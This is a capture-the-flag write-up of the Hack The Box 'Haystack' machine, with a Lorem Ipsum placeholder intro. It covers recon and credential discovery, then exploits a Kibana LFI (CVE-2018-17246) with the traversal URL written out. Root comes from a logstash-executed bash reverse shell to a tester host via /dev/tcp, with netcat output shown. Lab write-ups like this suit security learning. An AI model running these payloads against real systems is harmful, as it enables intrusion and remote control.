---
layout: single
title: Haystack - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-09-18
classes: wide
header:
  teaser: /assets/images/htb-writeup-haystack/haystack_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-haystack/haystack_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. nmap -Pn -sC -sV 10.10.10.115
    22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
    80/tcp   open  http    nginx 1.12.2
    9200/tcp open  http    nginx 1.12.2
    |_http-server-header: nginx/1.12.2
    |_http-title: 502 Bad Gateway

2. Download the image from http://10.10.10.115

3. strings needle.jpg shows base64 code at the end: bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==

    Decrypt gives us following Spanish text: la aguja en el pajar es "clave"
    .. or in English: the needle in the haystack is "key"

4. http://10.10.10.115:9200
    Clustername "elasticsearch" hints on how to move on. Googling elasticsearch gives the URI-syntax _search?q=WORD
    https://www.elastic.co/guide/en/elasticsearch/reference/current/search-uri-request.html

    http://10.10.10.115:9200/_search?q=clave
    "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
    "I have to save the key for the machine: dXNlcjogc2VjdXJpdHkg"

    "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
    "This key cannot be lost, I save it here: cGFzczogc3BhbmlzaC5pcy5rZXk="

5. Decrypt the keys (base64):
    dXNlcjogc2VjdXJpdHkg --> user: security
    cGFzczogc3BhbmlzaC5pcy5rZXk= --> pass: spanish.is.key

6. SSH with user/pass given above.
    [security@haystack ~]$ whoami
    security
    [security@haystack ~]$ cd /home/security/
    [security@haystack ~]$ ls -al
    total 16
    drwx------. 2 security security  99 Feb  6  2019 .
    drwxr-xr-x. 3 root     root      22 Nov 28  2018 ..
    lrwxrwxrwx. 1 root     root       9 Jan 25  2019 .bash_history -> /dev/null
    -rw-r--r--. 1 security security  18 Apr 10  2018 .bash_logout
    -rw-r--r--. 1 security security 193 Apr 10  2018 .bash_profile
    -rw-r--r--. 1 security security 231 Apr 10  2018 .bashrc
    -rw-r--r--. 1 security security  33 Feb  6  2019 user.txt
    [security@haystack ~]$ cat user.txt
    04d*****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Scan system with lse to find vulns. Under "Processes running with root permissions" we can find a lot of output regarding logstash.
    Reading up on logstash it is used for Kibana. Kibana uses port 5601 which is running locally.

    [security@haystack shm]$ ./lse.sh -l1
    [*] net000 Services listening only on localhost............................ yes!
    tcp    LISTEN     0      128    127.0.0.1:5601                  *:*


2. Setup a (remote) SSH tunnel to access the service from the attacking host.
    Remotly from Haystack: ssh -R 5601:127.0.0.1:5601 p3@10.10.14.7
    Or locally from Kali: ssh -L 5601:localhost:5601 security@10.10.10.115

    Open a web browser to http://127.0.0.1:5601 and you'll reach Kibana.

3. Kibana runs version 6.4.2 and is vulnerable for LFI (CVE-2018-17246)
    https://github.com/mpgn/CVE-2018-17246

    Upload a .js reverse shell to /dev/shm, start netcat locally and run the LFI:
    http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../dev/shm/node-rev.js

4. We don't get immediate root access with user kibana, so better upgrade to a proper shell
    root@p3:/opt/shells# nc -lnvp 4488
    listening on [any] 4488 ...
    connect to [10.10.14.7] from (UNKNOWN) [10.10.10.115] 41040
    whoami
    kibana
    cd /root
    /bin/sh: línea 3: cd: /root: Permiso denegado

5. Using lse.sh again we can see that dir /etc/logstash/conf.d is writable and has three interesting config files; filter.conf, input.conf, output.config
    input.conf looks for a file to execute every 10s in path /opt/kibana/ with filename logstash_*, however it must match the syntax of filter.conf

6. Create a reverse shell to be executed, matching input.conf and filter.conf
    bash-4.2$ echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.7/3366 0>&1" > /opt/kibana/logstash_p3.txt

7. Start netcat and wait for the incoming root shell
    root@p3:/opt/shells$ nc -lnvp 3366
    listening on [any] 3366 ...
    connect to [10.10.14.7] from (UNKNOWN) [10.10.10.115] 60796
    bash: no hay control de trabajos en este shell
    [root@haystack /]# whoami
    whoami
    root
    [root@haystack /]# cat /root/root.txt
    cat /root/root.txt
    3f5******************************
